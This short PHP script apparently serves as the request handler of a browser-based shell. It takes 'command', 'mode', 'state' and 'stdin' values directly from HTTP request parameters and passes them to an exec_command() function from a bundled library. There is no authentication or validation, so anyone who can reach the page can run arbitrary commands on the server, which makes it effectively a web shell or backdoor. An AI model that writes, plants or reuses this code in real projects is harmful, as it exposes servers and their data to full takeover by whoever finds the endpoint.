<?

require_once 'phpbash-lib.php5';

if (get_magic_quotes_gpc())
{
  function stripslashes_gpc(&$value)
  {
    $value = stripslashes($value);
  }
  array_walk_recursive($_REQUEST, stripslashes_gpc);
}

$command = $_REQUEST['command'];

$state = $_REQUEST['state'];

$mode = $_REQUEST['mode'];

$stdin = isset($_REQUEST['stdin']) ? $_REQUEST['stdin'] : null;

exec_command($mode, $command, $stdin, $state);

?>